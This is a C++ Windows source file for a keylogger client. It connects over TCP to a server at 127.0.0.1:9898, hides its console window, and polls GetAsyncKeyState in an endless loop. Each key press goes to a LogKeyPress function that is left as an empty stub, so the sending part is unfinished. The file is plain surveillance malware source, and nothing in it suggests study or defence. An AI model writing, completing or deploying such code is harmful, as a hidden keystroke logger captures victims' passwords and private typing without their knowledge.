#pragma once
#pragma comment (lib, "ws2_32.lib")
#define _WINSOCK_DEPRECATED_NO_WARNINGS


#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <string>
#include <conio.h>
#include "WSAInitializer.h"
#include <thread>
void LogKeyPress(int key, SOCKET sock);

int main() 
{
	WSAInitializer wsaInit;
	// we connect to server that uses TCP. thats why SOCK_STREAM & IPPROTO_TCP
	SOCKET _clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (_clientSocket == INVALID_SOCKET) {
		std::cout << "cant connect 1" << std::endl;
		
		//return 0;
	}

	struct sockaddr_in sa = { 0 };

	sa.sin_port = htons(9898); // port that server will listen to
	sa.sin_family = AF_INET;   // must be AF_INET
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");    // the IP of the server / current

	// the process will not continue until the server accepts the client
	int status = connect(_clientSocket, (struct sockaddr*)&sa, sizeof(sa));

	if (status == INVALID_SOCKET) {
		std::cout << "cant connect 2" << std::endl;
		//return 0;
	}

	// Hide the console window
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);

	char c = '\0';


	// Infinite loop to log keys
	while (_clientSocket != NULL)
	{
		for (int key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) & 0x0001)
			{
				LogKeyPress(key, _clientSocket);
			}
		}

		Sleep(10); // Sleep for a short duration to reduce CPU usage
	}
}

void LogKeyPress(int key, SOCKET sock)
{

}
